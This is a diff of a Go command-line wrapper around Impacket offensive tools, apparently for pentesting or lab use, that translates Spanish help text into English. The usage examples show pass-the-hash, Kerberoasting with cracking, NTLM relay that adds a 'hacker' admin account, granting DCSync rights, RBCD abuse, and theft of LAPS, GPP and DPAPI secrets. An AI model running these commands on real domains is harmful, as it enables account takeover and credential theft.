@@ -48,12 +48,12 @@ func buildImpkt(host, user, pass, domain, hash string) (string, []string) {
 
 // ── ejecución remota ──────────────────────────────────────────────────────
 
-const wmiexecUsage = `uso: wmiexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] [cmd]
+const wmiexecUsage = `usage: wmiexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] [cmd]
 
-  Shell interactivo o comando único vía WMI (sin binario en disco).
+  Interactive shell or single command via WMI (no binary on disk).
   -H   NTLM hash :NT  (pass-the-hash)
 
-ejemplos:
+examples:
   wmiexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org
   wmiexec 10.2.20.100 -u svc_sql -p shelby 'net localgroup administrators'
   wmiexec 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c`
@@ -77,12 +77,12 @@ func (cl *CLI) cmdWmiexec(args []string) {
 	cl.runTool(a)
 }
 
-const psexecUsage = `uso: psexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>]
+const psexecUsage = `usage: psexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>]
 
-  Shell SYSTEM vía servicio SMB (sube binario temporal).
+  SYSTEM shell via SMB service (uploads temporary binary).
   -H   NTLM hash :NT  (pass-the-hash)
 
-ejemplos:
+examples:
   psexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org
   psexec 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c`
 
@@ -100,12 +100,12 @@ func (cl *CLI) cmdPsexec(args []string) {
 	cl.runTool(append(append([]string{tool}, extra...), ident))
 }
 
-const smbexecUsage = `uso: smbexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>]
+const smbexecUsage = `usage: smbexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>]
 
-  Shell vía SMB (no deja binario en disco, usa cmd.exe).
+  Shell via SMB (no binary on disk, uses cmd.exe).
   -H   NTLM hash :NT  (pass-the-hash)
 
-ejemplos:
+examples:
   smbexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org
   smbexec 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c`
 
@@ -123,11 +123,11 @@ func (cl *CLI) cmdSmbexec(args []string) {
 	cl.runTool(append(append([]string{tool}, extra...), ident))
 }
 
-const dcomexecUsage = `uso: dcomexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] [-object <obj>] [cmd]
+const dcomexecUsage = `usage: dcomexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] [-object <obj>] [cmd]
 
-  Shell o comando vía DCOM. -object: MMC20 | ShellWindows | ShellBrowserWindow (default: MMC20)
+  Shell or command via DCOM. -object: MMC20 | ShellWindows | ShellBrowserWindow (default: MMC20)
 
-ejemplos:
+examples:
   dcomexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org
   dcomexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org -object ShellWindows 'whoami'`
 
@@ -153,11 +153,11 @@ func (cl *CLI) cmdDcomexec(args []string) {
 	cl.runTool(a)
 }
 
-const atexecUsage = `uso: atexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] <cmd>
+const atexecUsage = `usage: atexec <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] <cmd>
 
-  Ejecuta un comando vía Task Scheduler (sin shell interactivo).
+  Execute a command via Task Scheduler (no interactive shell).
 
-ejemplos:
+examples:
   atexec 10.2.20.100 -u Administrator -p 'P@ss1!' -d cs.org 'whoami /all'
   atexec 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c 'hostname'`
 
@@ -177,13 +177,13 @@ func (cl *CLI) cmdAtexec(args []string) {
 
 // ── kerberos ──────────────────────────────────────────────────────────────
 
-const kerberoastUsage = `uso: kerberoast <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-w <wordlist>]
+const kerberoastUsage = `usage: kerberoast <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-w <wordlist>]
 
-  Solicita TGS para todas las cuentas con SPN y guarda los hashes.
-  Si se obtienen hashes, intenta crackearlos automáticamente con john.
-  -w   wordlist (por defecto: badpwds.txt si existe, o rockyou.txt)
+  Requests TGS for all accounts with SPN and saves the hashes.
+  If hashes are obtained, attempts to crack them automatically with john.
+  -w   wordlist (default: badpwds.txt if it exists, or rockyou.txt)
 
-ejemplos:
+examples:
   kerberoast 10.2.20.100 -d cs.org -u mssql_svc -p shelby
   kerberoast 10.2.20.100 -d cs.org -u mssql_svc -H :aad3b435b51404eeaad3b435b51404ee
   kerberoast 10.2.20.100 -d cs.org -u mssql_svc -p shelby -w /usr/share/wordlists/rockyou.txt`
@@ -209,7 +209,7 @@ func (cl *CLI) cmdKerberoast(args []string) {
 
 	data, err := os.ReadFile(outFile)
 	if err != nil || len(data) == 0 {
-		fmt.Println("[!] no se obtuvieron hashes de Kerberoast")
+		fmt.Println("[!] no Kerberoast hashes obtained")
 		return
 	}
 	fmt.Printf("[+] hashes → %s\n", outFile)
@@ -231,15 +231,15 @@ func (cl *CLI) cmdKerberoast(args []string) {
 	cl.runTool([]string{john, "--format=krb5tgs", "--show", outFile})
 }
 
-const getTGTUsage = `uso: gettgt <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]
+const getTGTUsage = `usage: gettgt <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]
 
-  Solicita un TGT y lo guarda como <user>.ccache.
+  Requests a TGT and saves it as <user>.ccache.
   -H   NTLM hash :NT  (overpass-the-hash → TGT)
 
-  Después de ejecutar:
+  After running:
     export KRB5CCNAME=<user>.ccache
 
-ejemplos:
+examples:
   gettgt 10.2.20.100 -d cs.org -u mssql_svc -p shelby
   gettgt 10.2.20.100 -d cs.org -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c`
 
@@ -273,16 +273,16 @@ func (cl *CLI) cmdGetTGT(args []string) {
 	}
 }
 
-const getSTUsage = `uso: getst <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -spn <spn> [-impersonate <user>]
+const getSTUsage = `usage: getst <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -spn <spn> [-impersonate <user>]
 
-  Solicita un service ticket (silver ticket / S4U2Proxy).
-  -spn          SPN objetivo  (ej: cifs/WIN2022.cs.org)
-  -impersonate  usuario a suplantar vía S4U2Proxy
+  Requests a service ticket (silver ticket / S4U2Proxy).
+  -spn          target SPN  (e.g.: cifs/WIN2022.cs.org)
+  -impersonate  user to impersonate via S4U2Proxy
 
-  Después de ejecutar:
+  After running:
     export KRB5CCNAME=<user>@<spn>@DOMAIN.ccache
 
-ejemplos:
+examples:
   getst 10.2.20.100 -d cs.org -u svc_sql -p shelby -spn cifs/WIN2022-SRV-X64.cs.org
   getst 10.2.20.100 -d cs.org -u svc_sql -p shelby -spn cifs/WIN2022-SRV-X64.cs.org -impersonate Administrator`
 
@@ -315,11 +315,11 @@ func (cl *CLI) cmdGetST(args []string) {
 	cl.runTool(a)
 }
 
-const describeTicketUsage = `uso: describeticket <ticket.ccache>
+const describeTicketUsage = `usage: describeticket <ticket.ccache>
 
-  Decodifica y muestra los campos de un ticket Kerberos (.ccache o .kirbi).
+  Decodes and shows the fields of a Kerberos ticket (.ccache or .kirbi).
 
-ejemplos:
+examples:
   describeticket Administrator.ccache
   describeticket silver.kirbi`
 
@@ -336,11 +336,11 @@ func (cl *CLI) cmdDescribeTicket(args []string) {
 	cl.runTool([]string{tool, pos[0]})
 }
 
-const ticketConverterUsage = `uso: ticketconverter <input> <output>
+const ticketConverterUsage = `usage: ticketconverter <input> <output>
 
-  Convierte tickets entre .ccache (Linux) y .kirbi (Windows/Mimikatz).
+  Converts tickets between .ccache (Linux) and .kirbi (Windows/Mimikatz).
 
-ejemplos:
+examples:
   ticketconverter Administrator.ccache Administrator.kirbi
   ticketconverter ticket.kirbi ticket.ccache`
 
@@ -359,15 +359,15 @@ func (cl *CLI) cmdTicketConverter(args []string) {
 
 // ── enumeración AD/SMB ────────────────────────────────────────────────────
 
-const lookupsidUsage = `uso: lookupsid <target> [-u <user>] [-p <pass>] [-d <domain>] [-H <hash>] [-range <N>]
+const lookupsidUsage = `usage: lookupsid <target> [-u <user>] [-p <pass>] [-d <domain>] [-H <hash>] [-range <N>]
 
-  RID brute-force para enumerar usuarios y grupos locales o de dominio.
-  -range   RID máximo (por defecto 4000)
+  RID brute-force to enumerate local or domain users and groups.
+  -range   max RID (default 4000)
 
-  Null session (no credenciales):
+  Null session (no credentials):
     lookupsid 10.2.20.100
 
-ejemplos:
+examples:
   lookupsid 10.2.20.100
   lookupsid 10.2.20.100 -u mssql_svc -p shelby
   lookupsid 10.2.20.100 -u mssql_svc -p shelby -range 6000`
@@ -396,11 +396,11 @@ func (cl *CLI) cmdLookupSID(args []string) {
 	cl.runTool(a)
 }
 
-const samrdumpUsage = `uso: samrdump <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>]
+const samrdumpUsage = `usage: samrdump <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>]
 
-  Enumera usuarios, grupos y políticas de contraseña vía SAMR.
+  Enumerates users, groups and password policies via SAMR.
 
-ejemplos:
+examples:
   samrdump 10.2.20.100 -u mssql_svc -p shelby
   samrdump 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c -d cs.org`
 
@@ -418,12 +418,12 @@ func (cl *CLI) cmdSamrdump(args []string) {
 	cl.runTool(append(append([]string{tool}, extra...), ident))
 }
 
-const rpcdumpUsage = `uso: rpcdump <target> [-u <user>] [-p <pass>] [-d <domain>] [-port <port>]
+const rpcdumpUsage = `usage: rpcdump <target> [-u <user>] [-p <pass>] [-d <domain>] [-port <port>]
 
-  Enumera endpoints RPC/MSRPC expuestos por el objetivo.
-  -port   puerto (por defecto: 135)
+  Enumerates RPC/MSRPC endpoints exposed by the target.
+  -port   port (default: 135)
 
-ejemplos:
+examples:
   rpcdump 10.2.20.100
   rpcdump 10.2.20.100 -u mssql_svc -p shelby
   rpcdump 10.2.20.100 -port 445`
@@ -454,11 +454,11 @@ func (cl *CLI) cmdRPCDump(args []string) {
 	cl.runTool(a)
 }
 
-const getadusersUsage = `uso: getadusers <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-all]
+const getadusersUsage = `usage: getadusers <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-all]
 
-  Enumera usuarios de AD vía LDAP. -all muestra atributos adicionales.
+  Enumerates AD users via LDAP. -all shows additional attributes.
 
-ejemplos:
+examples:
   getadusers 10.2.20.100 -d cs.org -u mssql_svc -p shelby
   getadusers 10.2.20.100 -d cs.org -u mssql_svc -p shelby -all`
 
@@ -482,11 +482,11 @@ func (cl *CLI) cmdGetADUsers(args []string) {
 	cl.runTool(a)
 }
 
-const getadcomputersUsage = `uso: getadcomputers <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]
+const getadcomputersUsage = `usage: getadcomputers <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]
 
-  Enumera equipos de AD vía LDAP.
+  Enumerates AD computers via LDAP.
 
-ejemplos:
+examples:
   getadcomputers 10.2.20.100 -d cs.org -u mssql_svc -p shelby`
 
 func (cl *CLI) cmdGetADComputers(args []string) {
@@ -505,11 +505,11 @@ func (cl *CLI) cmdGetADComputers(args []string) {
 	cl.runTool(a)
 }
 
-const findDelegationUsage = `uso: finddelegation <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]
+const findDelegationUsage = `usage: finddelegation <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]
 
-  Busca cuentas con delegación configurada (Unconstrained, Constrained, RBCD).
+  Searches for accounts with delegation configured (Unconstrained, Constrained, RBCD).
 
-ejemplos:
+examples:
   finddelegation 10.2.20.100 -d cs.org -u mssql_svc -p shelby`
 
 func (cl *CLI) cmdFindDelegation(args []string) {
@@ -528,12 +528,12 @@ func (cl *CLI) cmdFindDelegation(args []string) {
 	cl.runTool(a)
 }
 
-const getLAPSUsage = `uso: getlaps <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-computer <name>]
+const getLAPSUsage = `usage: getlaps <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-computer <name>]
 
-  Lee contraseñas LAPS de equipos en AD.
-  -computer  filtrar por nombre de equipo (ej: WIN2022-SRV-X64$)
+  Reads LAPS passwords for computers in AD.
+  -computer  filter by computer name (e.g.: WIN2022-SRV-X64$)
 
-ejemplos:
+examples:
   getlaps 10.2.20.100 -d cs.org -u Administrator -p 'P@ss1!'
   getlaps 10.2.20.100 -d cs.org -u Administrator -p 'P@ss1!' -computer WIN2022-SRV-X64$`
 
@@ -557,11 +557,11 @@ func (cl *CLI) cmdGetLAPS(args []string) {
 	cl.runTool(a)
 }
 
-const getgppUsage = `uso: getgpp <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]
+const getgppUsage = `usage: getgpp <target> -d <domain> -u <user> [-p <pass>] [-H <hash>]
 
-  Busca contraseñas en GPP/Preferences (SYSVOL cpassword).
+  Searches for passwords in GPP/Preferences (SYSVOL cpassword).
 
-ejemplos:
+examples:
   getgpp 10.2.20.100 -d cs.org -u mssql_svc -p shelby`
 
 func (cl *CLI) cmdGetGPP(args []string) {
@@ -580,11 +580,11 @@ func (cl *CLI) cmdGetGPP(args []string) {
 	cl.runTool(a)
 }
 
-const dumpntlminfoUsage = `uso: dumpntlminfo <target>
+const dumpntlminfoUsage = `usage: dumpntlminfo <target>
 
-  Obtiene información NTLM del objetivo (nombre, dominio, versión OS) sin autenticación.
+  Obtains NTLM information from the target (name, domain, OS version) without authentication.
 
-ejemplos:
+examples:
   dumpntlminfo 10.2.20.100`
 
 func (cl *CLI) cmdDumpNTLMInfo(args []string) {
@@ -602,12 +602,12 @@ func (cl *CLI) cmdDumpNTLMInfo(args []string) {
 
 // ── servicios de red ──────────────────────────────────────────────────────
 
-const mssqlclientUsage = `uso: mssqlclient <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] [-windows-auth] [-port <port>]
+const mssqlclientUsage = `usage: mssqlclient <target> -u <user> [-p <pass>] [-d <domain>] [-H <hash>] [-windows-auth] [-port <port>]
 
-  Cliente MSSQL interactivo. Con -windows-auth usa autenticación Windows/Kerberos.
-  Una vez conectado: help / xp_cmdshell / enable_xp_cmdshell
+  Interactive MSSQL client. With -windows-auth uses Windows/Kerberos authentication.
+  Once connected: help / xp_cmdshell / enable_xp_cmdshell
 
-ejemplos:
+examples:
   mssqlclient 10.2.20.100 -u sa -p 'P@ss1!'
   mssqlclient 10.2.20.100 -u mssql_svc -p shelby -d cs.org -windows-auth
   mssqlclient 10.2.20.100 -u mssql_svc -H :8846f7eaee8fb117ad06bdd830b7586c -windows-auth`
@@ -634,12 +634,12 @@ func (cl *CLI) cmdMssqlclient(args []string) {
 	cl.runTool(a)
 }
 
-const smbclientUsage = `uso: smbclient <target> [-u <user>] [-p <pass>] [-d <domain>] [-H <hash>]
+const smbclientUsage = `usage: smbclient <target> [-u <user>] [-p <pass>] [-d <domain>] [-H <hash>]
 
-  Cliente SMB interactivo para navegar shares y transferir archivos.
-  Sin credenciales intenta null/guest session.
+  Interactive SMB client to browse shares and transfer files.
+  Without credentials attempts null/guest session.
 
-ejemplos:
+examples:
   smbclient 10.2.20.100
   smbclient 10.2.20.100 -u mssql_svc -p shelby -d cs.org`
 
@@ -663,17 +663,17 @@ func (cl *CLI) cmdSmbclient(args []string) {
 	cl.runTool(a)
 }
 
-const smbserverUsage = `uso: smbserver <share_name> <share_path> [-port <port>]
+const smbserverUsage = `usage: smbserver <share_name> <share_path> [-port <port>]
 
-  Levanta un servidor SMB en Kali para compartir archivos.
-  Útil para servir payloads al objetivo sin subir a HTTP.
-  -port   puerto SMB (por defecto 445, necesita root; usa 4445 sin root)
+  Starts an SMB server on Kali to share files.
+  Useful for serving payloads to the target without uploading to HTTP.
+  -port   SMB port (default 445, requires root; use 4445 without root)
 
-ejemplos:
+examples:
   smbserver SHARE /tmp/payloads
   smbserver SHARE /tmp/payloads -port 4445
 
-  En el objetivo (Windows):
+  On the target (Windows):
     copy \\10.2.20.200\SHARE\agent.exe .`
 
 func (cl *CLI) cmdSmbserver(args []string) {
@@ -694,16 +694,16 @@ func (cl *CLI) cmdSmbserver(args []string) {
 	cl.runTool(a)
 }
 
-const ntlmrelayxUsage = `uso: ntlmrelayx -tf <targets.txt> [-smb2] [-socks] [-l <outdir>] [-c <cmd>]
+const ntlmrelayxUsage = `usage: ntlmrelayx -tf <targets.txt> [-smb2] [-socks] [-l <outdir>] [-c <cmd>]
 
-  Relay de autenticaciones NTLM capturadas hacia objetivos en targets.txt.
-  Combinar con responder -A (modo análisis) para no interferir.
-  -smb2   habilitar soporte SMB2
-  -socks  modo SOCKS (mantiene sesiones autenticadas)
-  -l      volcar SAM a directorio
-  -c      ejecutar comando en lugar de volcar SAM
+  Relay of captured NTLM authentications to targets in targets.txt.
+  Combine with responder -A (analysis mode) to avoid interference.
+  -smb2   enable SMB2 support
+  -socks  SOCKS mode (maintains authenticated sessions)
+  -l      dump SAM to directory
+  -c      execute command instead of dumping SAM
 
-ejemplos:
+examples:
   ntlmrelayx -tf targets.txt -smb2
   ntlmrelayx -tf targets.txt -smb2 -socks
   ntlmrelayx -tf targets.txt -smb2 -c 'net user hacker P@ss /add && net localgroup administrators hacker /add'`
@@ -723,15 +723,15 @@ func (cl *CLI) cmdNtlmrelayx(args []string) {
 
 // ── AD privilege escalation / DACL ────────────────────────────────────────
 
-const dacleditUsage = `uso: dacledit <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -action <read|write|remove> [-principal <user>] [-rights <perm>] [-target <dn>]
+const dacleditUsage = `usage: dacledit <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -action <read|write|remove> [-principal <user>] [-rights <perm>] [-target <dn>]
 
-  Lee o modifica DACLs de objetos AD.
+  Reads or modifies DACLs of AD objects.
   -action   read | write | remove
-  -principal  usuario/grupo al que asignar/quitar el derecho
+  -principal  user/group to assign/remove the right from
   -rights   FullControl | ResetPassword | WriteMembers | DCSync | ...
-  -target   Distinguished Name del objeto objetivo
+  -target   Distinguished Name of the target object
 
-ejemplos:
+examples:
   dacledit 10.2.20.100 -d cs.org -u Administrator -p 'P@ss1!' -action read -target-dn 'DC=cs,DC=org'
   dacledit 10.2.20.100 -d cs.org -u Administrator -p 'P@ss1!' -action write -rights DCSync -principal hacker -target-dn 'DC=cs,DC=org'`
 
@@ -764,14 +764,14 @@ func (cl *CLI) cmdDacledit(args []string) {
 	cl.runTool(a)
 }
 
-const rbcdUsage = `uso: rbcd <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -action <read|write|remove> [-delegate-from <src>] [-delegate-to <dst>]
+const rbcdUsage = `usage: rbcd <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -action <read|write|remove> [-delegate-from <src>] [-delegate-to <dst>]
 
-  Gestiona Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity).
+  Manages Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity).
   -action        read | write | remove
-  -delegate-from equipo que puede delegar  (ej: EVIL$)
-  -delegate-to   equipo objetivo           (ej: WIN2022-SRV-X64$)
+  -delegate-from computer that can delegate  (e.g.: EVIL$)
+  -delegate-to   target computer             (e.g.: WIN2022-SRV-X64$)
 
-ejemplos:
+examples:
   rbcd 10.2.20.100 -d cs.org -u mssql_svc -p shelby -action read -delegate-to WIN2022-SRV-X64$
   rbcd 10.2.20.100 -d cs.org -u mssql_svc -p shelby -action write -delegate-from EVIL$ -delegate-to WIN2022-SRV-X64$`
 
@@ -798,13 +798,13 @@ func (cl *CLI) cmdRBCD(args []string) {
 	cl.runTool(a)
 }
 
-const addcomputerUsage = `uso: addcomputer <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-name <computer$>] [-cpass <pass>]
+const addcomputerUsage = `usage: addcomputer <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] [-name <computer$>] [-cpass <pass>]
 
-  Añade una cuenta de equipo al dominio (útil para RBCD).
-  -name    nombre del equipo (ej: EVIL$); se genera uno aleatorio si se omite
-  -cpass   contraseña del equipo (por defecto: Passw0rd!)
+  Adds a machine account to the domain (useful for RBCD).
+  -name    computer name (e.g.: EVIL$); a random one is generated if omitted
+  -cpass   computer password (default: Passw0rd!)
 
-ejemplos:
+examples:
   addcomputer 10.2.20.100 -d cs.org -u mssql_svc -p shelby
   addcomputer 10.2.20.100 -d cs.org -u mssql_svc -p shelby -name EVIL$ -cpass 'C0mputer!'`
 
@@ -832,13 +832,13 @@ func (cl *CLI) cmdAddComputer(args []string) {
 	cl.runTool(a)
 }
 
-const changepasswdUsage = `uso: changepasswd <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -np <newpass> [-alt-u <altuser>] [-alt-p <altpass>]
+const changepasswdUsage = `usage: changepasswd <target> -d <domain> -u <user> [-p <pass>] [-H <hash>] -np <newpass> [-alt-u <altuser>] [-alt-p <altpass>]
 
-  Cambia la contraseña de una cuenta AD.
-  Sin -alt-u/-alt-p cambia la propia contraseña del usuario autenticado.
-  Con -alt-u/-alt-p fuerza el cambio de contraseña de otro usuario (requiere permisos).
+  Changes the password of an AD account.
+  Without -alt-u/-alt-p changes the authenticated user's own password.
+  With -alt-u/-alt-p forces a password change for another user (requires permissions).
 
-ejemplos:
+examples:
   changepasswd 10.2.20.100 -d cs.org -u mssql_svc -p shelby -np 'N3wPass!'
   changepasswd 10.2.20.100 -d cs.org -u Administrator -p 'P@ss1!' -np 'N3wPass!' -alt-u victim`
 
@@ -867,21 +867,21 @@ func (cl *CLI) cmdChangePasswd(args []string) {
 
 // ── DPAPI ─────────────────────────────────────────────────────────────────
 
-const dpapiUsage = `uso: dpapi <subcommand> [opciones]
+const dpapiUsage = `usage: dpapi <subcommand> [options]
 
-  Extrae secretos protegidos por DPAPI (masterkeys, credenciales, vaults, navegadores).
+  Extracts DPAPI-protected secrets (masterkeys, credentials, vaults, browsers).
 
-  subcommands principales:
-    masterkey   descifrar masterkeys
-    credential  descifrar credencial DPAPI
-    vault       descifrar vault (.vrd/.vpol)
-    backupkeys  volcar backup keys del DC (necesita DA)
-    chrome      credenciales de Chrome/Edge
+  main subcommands:
+    masterkey   decrypt masterkeys
+    credential  decrypt DPAPI credential
+    vault       decrypt vault (.vrd/.vpol)
+    backupkeys  dump DC backup keys (requires DA)
+    chrome      Chrome/Edge credentials
 
-  Para ayuda detallada de cada subcomando:
+  For detailed help on each subcommand:
     !impacket-dpapi <subcommand> --help
 
-ejemplos:
+examples:
   dpapi backupkeys -d cs.org -u Administrator -p 'P@ss1!' --dc-ip 10.2.20.100 --export
   dpapi masterkey -file /tmp/masterkey -sid S-1-5-21-... -pvk domain_backup.pvk
   dpapi credential -file /tmp/cred -key <hex_key>`
@@ -900,18 +900,18 @@ func (cl *CLI) cmdDpapi(args []string) {
 
 // ── passthrough genérico ──────────────────────────────────────────────────
 
-const impacketUsage = `uso: impacket <herramienta> [argumentos...]
+const impacketUsage = `usage: impacket <tool> [arguments...]
 
-  Passthrough directo a cualquier herramienta impacket instalada.
-  Equivale a ejecutar: impacket-<herramienta> [argumentos...]
+  Direct passthrough to any installed impacket tool.
+  Equivalent to running: impacket-<tool> [arguments...]
 
-  TAB completa los nombres de herramienta disponibles.
+  TAB completes available tool names.
 
-herramientas (selección):
-  Ejecución:  wmiexec  psexec  smbexec  dcomexec  atexec
+tools (selection):
+  Execution:  wmiexec  psexec  smbexec  dcomexec  atexec
   Kerberos:   GetNPUsers  GetUserSPNs  getTGT  getST  goldenPac  ticketer
   Enum AD:    GetADUsers  GetADComputers  findDelegation  GetLAPSPassword  Get-GPPPassword
-  Red/SMB:    lookupsid  samrdump  rpcdump  rpcmap  smbclient  smbserver
+  Net/SMB:    lookupsid  samrdump  rpcdump  rpcmap  smbclient  smbserver
   MSSQL:      mssqlclient  mssqlinstance
   Relay:      ntlmrelayx
   DACL/Priv:  dacledit  owneredit  rbcd  addcomputer  changepasswd
@@ -919,12 +919,12 @@ herramientas (selección):
   DPAPI:      dpapi
   Dump:       secretsdump  reg  DumpNTLMInfo
   Kerberos+:  keylistattack  raiseChild  getPac
-  Otros:      getArch  rdp_check  services  netview  machine_role  exchanger
+  Other:      getArch  rdp_check  services  netview  machine_role  exchanger
 
-  Para ayuda de una herramienta concreta:
-    impacket <herramienta> --help
+  For help with a specific tool:
+    impacket <tool> --help
 
-ejemplos:
+examples:
   impacket rpcmap 10.2.20.100 -auth-level 1
   impacket goldenPac cs.org/Administrator:'P@ss1!'@WIN2022-SRV-X64.cs.org
   impacket owneredit cs.org/admin:'P@ss1!'@10.2.20.100 -action read -target victim`
@@ -937,8 +937,8 @@ func (cl *CLI) cmdImpacket(args []string) {
 	toolName := args[0]
 	tool := cl.findTool("impacket-"+toolName, toolName+".py")
 	if tool == "" {
-		fmt.Printf("[!] herramienta no encontrada: impacket-%s\n", toolName)
-		fmt.Printf("    instala con: apt-get install -y impacket-scripts python3-impacket\n")
+		fmt.Printf("[!] tool not found: impacket-%s\n", toolName)
+		fmt.Printf("    install with: apt-get install -y impacket-scripts python3-impacket\n")
 		return
 	}
 	cl.runTool(append([]string{tool}, args[1:]...))
